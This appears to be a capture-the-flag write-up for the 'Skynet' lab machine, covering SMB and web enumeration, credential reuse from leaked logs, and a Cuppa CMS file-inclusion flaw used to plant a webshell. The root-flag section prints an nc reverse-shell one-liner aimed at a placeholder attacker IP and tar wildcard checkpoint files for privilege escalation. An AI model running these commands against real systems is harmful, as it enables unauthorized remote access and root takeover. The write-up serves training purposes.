# Skynet

### Deploy and compromise the vulnerable machine!

Ran an [nmap scan](./skynet.nmap) and found ssh, http, pop3, imap and SMB ports open.

Enumerated shares and users with [nmap scripts](./skynet-smb-enum.nmap), found 3 shares (anonymous, milesdyson, IPC$) 
and 1 user (milesdyson).

Enumerated http server directories with [gobuster](./skynet.gobuster), found 6 directories (admin, css, js, 
config, ai and squirrelmai). /squirrelmail is an email log in portal, and the remaining 
directories were forbidden.

**What is Miles password for his emails?**

Started by using smbclient to connect to the /anonymous share. Found a txt file and a 
directory containing log files, used smbget to download the contents of the share.

The txt file, attention.txt, stated that: "a system malfunction has caused various passwords 
to be changed. All skynet employees are required to change their password". One of the log 
files contained what looked to be plaintext passwords.

Used the username milesdyson found in the SMB enumeration and a password from the log file 
to log into Miles' email account on the SquirrelMail portal.

**What is the hidden directory?**

In Miles' inbox an email states that the Samba server password was reset after a system 
malfunction and reveals the new password.

Logged into the milesdyson share with the Samba password and milesdyson username.

Found a txt file named important.txt inside a notes folder on the share containing a note 
about a CMS directory on the http server.

**What is the vulnerability called when you can include a remote file for malicious purposes?**

Navigated to the CMS directory and ran another gobuster directory scan and found an 
administrator portal called Cuppa CMS. Looking at the source code gives an indication of the 
version

Found a vulnerability on exploit-db for LFI and RFI, used it to upload a php webshell and 
gain remote code execution.

**What is the user flag?**

Using the webshell found the flag in milesdyson's home directory. The user.txt flag can also
be read through the LFI vulnerability.

**What is the root flag?**

There is a cronjob to backup the files at /var/www/html executing with root privileges and 
using tar with a wildcard. It can be exploited using checkpoints to run a script in that 
directory with root privileges.

Reverse shell script:

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> <PORT> >/tmp/f" > shell.sh`

Checkpoint files to execute the script:

`touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`

`touch "/var/www/html/--checkpoint=1"`

Found the root flag in /root.